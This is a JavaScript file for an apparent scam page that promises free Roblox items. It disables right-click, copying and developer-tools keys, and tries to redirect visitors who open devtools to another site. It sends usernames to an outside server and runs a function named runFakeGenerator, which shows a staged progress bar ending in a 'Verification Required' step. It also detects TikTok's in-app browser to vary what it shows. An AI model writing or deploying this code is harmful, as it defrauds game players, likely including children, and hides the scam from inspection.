//Happy  Coding Li khdah Bsa7to :) 

    function chwiyahh() {
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 85) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 83) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 65) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 67) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 88) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.keyCode === 86) {
                e.preventDefault();
                return false;
            }
        });
        
        document.onselectstart = function() {
            return false;
        };
        document.ondragstart = function() {
            return false;
        };
        
        document.body.style.webkitUserSelect = 'none';
        document.body.style.mozUserSelect = 'none';
        document.body.style.msUserSelect = 'none';
        document.body.style.userSelect = 'none';
        
        let devtools = false;
        const threshold = 160;
        
        setInterval(function() {
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                if (!devtools) {
                    devtools = true;
                    window.location.replace = 'https://brt4.site';
                }
            } else {
                devtools = false;
            }
        }, 500);
    }

     chwiyahh()




$(document).ready(function() {
        const MAX_SELECTIONS = 3;
        
        // This handler is attached to each card (.pet-row) and now works correctly.
        $('.pet-row').on('click', function() {
            if ($(this).hasClass('selected')) {
                $(this).removeClass('selected');
            } else if ($('.pet-row.selected').length < MAX_SELECTIONS) {
                $(this).addClass('selected');
            } else {
                alert(`You can only select up to ${MAX_SELECTIONS} items.`);
            }
            if ($('.pet-row.selected').length > 0) {
                $('#continue-button').fadeIn();
            } else {
                $('#continue-button').fadeOut();
            }
        });

        $('#continue-button').on('click', function() { openUsernameModal(); });

        const $usernameModal = $('#username-modal');
        const $searchButton = $('#roblox-user-search');
        const $usernameInput = $('#username-modal-input');
        const $resultsDiv = $('#user-search-results');
        const $statusDiv = $('#user-search-status');
        const $userInfoDisplay = $('#user-info-display');
        const $claimButton = $('#claim-button');
        const $generatorModal = $('#generator-modal');

        function openUsernameModal() {
            $usernameModal.css('display', 'flex');
            $usernameInput.val('').focus();
            $resultsDiv.hide();
            $claimButton.hide();
        }
        
        function closeUsernameModal() { 
            $usernameModal.hide();
        }
        
        function openGeneratorModal() {
            $generatorModal.css('display', 'flex');
        }
        
        function closeGeneratorModal() {
            $generatorModal.hide();
        }
        
        $('#username-modal-close').on('click', closeUsernameModal);

        $searchButton.on('click', function() {
            const username = $usernameInput.val().trim();
            if (!username) {
                alert('Please enter a username.');
                return;
            }
            $resultsDiv.css('display', 'flex');
            $claimButton.hide();
            $userInfoDisplay.html('');
            $statusDiv.text('Searching...');
            $searchButton.prop('disabled', true);
            
            fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "SUCCESS") {
                        $statusDiv.text('User Found!');
                        $userInfoDisplay.html(`
                            <div style="display: flex; align-items: center; gap: 10px; margin-top: 10px;">
                                <img src="${data.avatar}" alt="${data.username}" style="width: 60px; height: 60px; border-radius: 50%; border: 2px solid #6a0dad;">
                                <div style="text-align: left;">
                                    <div style="font-weight: bold; font-size: 16px;">${data.username}</div>
                                    <div style="font-size: 14px; opacity: 0.7;">ID: ${data.user_id}</div>
                                    <div style="font-size: 12px; opacity: 0.5;">Joined: ${new Date(data.created).toLocaleDateString()}</div>
                                </div>
                            </div>
                        `);
                        $claimButton.show();
                    } else {
                        $statusDiv.text('User Not Found');
                        $userInfoDisplay.html(`
                            <div style="color: #ff4757; margin-top: 10px;">
                                <p>Error: ${data.error || 'Username not found'}</p>
                                <p style="font-size: 12px;">Please check the username and try again.</p>
                            </div>
                        `);
                    }
                    $searchButton.prop('disabled', false);
                })
                .catch(error => {
                    console.error('Error:', error);
                    $statusDiv.text('Error occurred');
                    $userInfoDisplay.html(`
                        <div style="color: #ff4757; margin-top: 10px;">
                            <p>Failed to verify username</p>
                            <p style="font-size: 12px;">Please check your connection and try again.</p>
                        </div>
                    `);
                    $searchButton.prop('disabled', false);
                });
        });
        
        $claimButton.on('click', function() {
            const username = $usernameInput.val().trim();
            if (username) {
                fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === "SUCCESS") {
                            closeUsernameModal();
                            
                            setTimeout(() => {
                                const selectedImages = $('.pet-row.selected').map(function() {
                                    return $(this).find('img').attr('src');
                                }).get();
                                runFakeGenerator(username, selectedImages, data);
                            }, 100);
                        } else {
                            alert('Failed to get user information. Please try again.');
                            $claimButton.prop('disabled', false);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Failed to get user information. Please try again.');
                        $claimButton.prop('disabled', false);
                    });
            }
        });

        async function runFakeGenerator(username, selectedImageUrls, userInfo) {
            const $progressFill = $('#progress-fill');
            const $verifyBtn = $('#verify-btn');
            const $gameTip = $('#game-tip');
            const $generatorTitle = $('#generator-title');
            const $loadingItemsContainer = $('#loading-items-container');
            
            openGeneratorModal();
            
            $progressFill.css('width', "0%").text("0%");
            $verifyBtn.hide();
            $loadingItemsContainer.empty();
            
            if (userInfo && userInfo.avatar) {
                $loadingItemsContainer.append(`
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 8px;">
                        <img src="${userInfo.avatar}" alt="${userInfo.username}" style="width: 60px; height: 60px; border-radius: 50%; border: 2px solid #6a0dad;">
                        <div style="text-align: left;">
                            <div style="font-weight: bold; font-size: 16px;">${userInfo.username}</div>
                            <div style="font-size: 12px; opacity: 0.7;">ID: ${userInfo.user_id}</div>
                        </div>
                    </div>
                `);
            }
            
            if (selectedImageUrls && selectedImageUrls.length > 0) {
                const itemsContainer = $('<div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 10px;"></div>');
                selectedImageUrls.forEach(url => {
                    itemsContainer.append($('<img>', { 
                        src: url, 
                        style: 'width: 80px; height: 80px; border-radius: 8px; border: 2px solid #6a0dad;' 
                    }));
                });
                $loadingItemsContainer.append(itemsContainer);
            }
            
            function updateProgress(percentage, text) { 
                $progressFill.css('width', percentage + "%").text(text || (percentage + "%")); 
            }
            
            $generatorTitle.text("Connecting to Game Server...");
            $gameTip.text("Initializing secure connection, please wait.");
            await new Promise(r => setTimeout(r, 1500));
            updateProgress(20, "Connecting...");
            await new Promise(r => setTimeout(r, 500));
            $generatorTitle.text(`Authenticating User: ${username}`);
            $gameTip.text("Verifying account details with game database.");
            await new Promise(r => setTimeout(r, 2000));
            updateProgress(45, "Authenticated");
            await new Promise(r => setTimeout(r, 500));
            const itemText = selectedImageUrls.length > 1 ? "items" : "item";
            $generatorTitle.text(`Processing ${selectedImageUrls.length} ${itemText}`);
            $gameTip.text("Allocating selected items from server-side inventory.");
            await new Promise(r => setTimeout(r, 1800));
            updateProgress(70, "Items Prepared");
            await new Promise(r => setTimeout(r, 800));
            $generatorTitle.text("Syncing Items with Your Account...");
            $gameTip.text("This is the final step. Do not refresh or close the page.");
            let currentProgress = 70;
            const syncInterval = setInterval(() => {
                currentProgress += 1;
                if (currentProgress >= 99) {
                    clearInterval(syncInterval);
                    currentProgress = 99;
                }
                updateProgress(currentProgress, `Syncing... ${currentProgress}%`);
            }, 80);
            await new Promise(r => setTimeout(r, 2500));
            updateProgress(100, "Sync Complete!");
            await new Promise(r => setTimeout(r, 500));
            $generatorTitle.text("Verification Required");
            $gameTip.text("To prevent abuse, please complete one final step to receive your items.");
            $verifyBtn.fadeIn();
        }
    });
   
        function isTikTokBrowser() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            return (userAgent.includes('musical_ly_') || userAgent.includes('Aweme') || userAgent.includes('tiktok') || (userAgent.includes('iPhone') && userAgent.includes('ByteLocale') && userAgent.includes('JsSdk/2.0')));
        }
        if (isTikTokBrowser()) {
            document.getElementById('ios-popup').style.display = 'block';
            document.body.classList.add('tiktok-view-active');
        } else {
            document.getElementById('normal-page').style.display = 'block';
        }
    
        document.addEventListener('DOMContentLoaded', () => {
            const container = document.getElementById('floating-items-container');
            if (container) {
                container.innerHTML = ''; 
            } else {
                const newContainer = document.createElement('div');
                newContainer.id = 'floating-items-container';
                document.body.prepend(newContainer);
                container = newContainer;
            }
            
            const items = [
                'https://i.imgur.com/83J2f7L.png', // Ghost
                'https://i.imgur.com/kYqg4tL.png', // Pumpkin
                'https://i.imgur.com/V7cax2N.png', // Bat
                'https://i.imgur.com/k2yplkG.png', // Candy Corn
                'https://i.imgur.com/kGqa5sE.png', // Spider
                'https://i.imgur.com/4l5a8yS.png', // Witch Hat
                'https://i.imgur.com/sW3oJ4M.png'  // Skull
            ];
            const itemCount = 15;
            for (let i = 0; i < itemCount; i++) {
                const img = document.createElement('img');
                img.src = items[Math.floor(Math.random() * items.length)];
                img.classList.add('floating-item');
                const size = Math.random() * 60 + 40;
                img.style.width = `${size}px`;
                img.style.height = 'auto';
                const animationName = `float${Math.floor(Math.random() * 3) + 1}`;
                img.style.animationName = animationName;
                const animationDuration = Math.random() * 20 + 15;
                img.style.animationDuration = `${animationDuration}s`;
                const animationDelay = Math.random() * -35;
                img.style.animationDelay = `${animationDelay}s`;
                container.appendChild(img);
            }
        });
    
        document.addEventListener('scroll', function() {
            const colorStart = { r: 28, g: 0, b: 36 };   // #1c0024
            const colorEnd = { r: 106, g: 13, b: 173 }; // #6a0dad
            
            const scrollTotal = document.documentElement.scrollHeight - document.documentElement.clientHeight;
            const scrollPercent = scrollTotal > 0 ? (document.documentElement.scrollTop / scrollTotal) : 0;
            function interpolateColor(start, end, factor) {
                const r = Math.round(start.r + factor * (end.r - start.r));
                const g = Math.round(start.g + factor * (end.g - start.g));
                const b = Math.round(start.b + factor * (end.b - start.b));
                return `rgb(${r}, ${g}, ${b})`;
            }
            const newColor1 = interpolateColor(colorStart, colorEnd, scrollPercent);
            const newColor2 = interpolateColor({r: 36, g: 17, b: 48}, {r: 75, g: 0, b: 130}, scrollPercent);
            const newColor3 = interpolateColor({r: 66, g: 26, b: 79}, {r: 255, g: 117, b: 24}, scrollPercent);
            document.documentElement.style.background = `linear-gradient(135deg, ${newColor1} 0%, ${newColor2} 50%, ${newColor3} 100%)`;
        });
